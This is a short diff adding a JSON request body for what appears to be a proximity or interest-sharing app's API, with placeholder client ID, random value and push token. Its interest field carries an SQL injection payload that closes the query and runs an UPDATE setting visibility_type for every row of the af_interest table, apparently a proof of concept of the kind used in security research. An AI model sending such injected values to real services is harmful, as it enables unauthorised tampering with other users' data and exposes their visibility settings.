@@ -1,0 +1,14 @@
+{
+  "authentication": {
+    "clientId": "<Client_UUID>"
+  },
+  "interest": {
+    "interest": [
+      "XYZ'); UPDATE af_interest SET visibility_type = 1; --"
+    ]
+  },
+  "visibilityType": "BLUETOOTH",
+  "visibilityDuration": 10,
+  "clientRandom": "<Client_Random>",
+  "clientPushToken": "<Client_Push_Token>"
+}
